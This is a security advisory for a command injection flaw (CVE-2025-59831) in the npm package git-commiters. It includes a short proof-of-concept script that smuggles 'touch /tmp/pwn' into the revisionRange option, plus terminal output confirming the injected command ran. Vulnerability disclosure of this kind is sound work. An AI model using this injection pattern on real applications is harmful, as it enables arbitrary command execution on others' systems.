# [H] `git-comiters` Command Injection vulnerability

## Summary
Severity: High
Advisory: GHSA-g38c-wxjf-xrh6
CVE: CVE-2025-59831
CWE: CWE-77, CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-09-22
Source: https://github.com/advisories/GHSA-g38c-wxjf-xrh6
Type: github-advisory

## Affected
- npm: `git-commiters` — affected >=0 <0.1.2

## Details
## Background on the vulnerability

This vulnerability manifests with the library's primary exported API: `gitCommiters(options, callback)`
which allows specifying options such as `cwd` for current working directory and `revisionRange` as a revision pointer, such as `HEAD`.

However, the library does not sanitize for user input or practice secure process execution API to separate commands from their arguments and as such, uncontrolled user input is concatenated into command execution.

## Exploit

1. Install `git-commiters@0.1.1` or earlier
2. Initiaizlie a new Git directory with commits in it
3. Create the following script in that directory:

```js
var gitCommiters = require("git-commiters");

var options = {
  cwd: "./",
  revisionRange: "HEAD; touch /tmp/pwn; #",
};
gitCommiters(options, function (err, result) {
  if (err) console.log(err);
  else console.log(result);
});
```

3. Observe new file created on disk at `/tmp/pwn`

The git commiters functionality works as expected, too, despite the command execution, which further hinders the problem as it may not be apparent that a command injection occured on a running application.

```sh
@lirantal ➜ /workspaces/git-commiters.js (master) $ node app.js
[
  {
    email: 'github@qslw.com',
    name: 'Morton Fox',
    deletions: 1,
    insertions: 1,
    commits: 1
  },
  {
    email: 'snowyu.lee@gmail.com',
    name: 'Riceball LEE',
    deletions: 11,
    insertions: 1198,
    commits: 7
  }
]

@lirantal ➜ /workspaces/git-commiters.js (master) $ ls -alh /tmp/pwn
-rw-r--rw- 1 codespace codespace 0 Jul  1 06:09 /tmp/pwn
```

# Credit

Liran Tal

## References
- https://github.com/snowyu/git-commiters.js/security/advisories/GHSA-g38c-wxjf-xrh6
- https://nvd.nist.gov/vuln/detail/CVE-2025-59831
- https://github.com/snowyu/git-commiters.js/commit/7f0abfedbf506e3a61ac875d91324a8dbe756e84
- https://github.com/snowyu/git-commiters.js
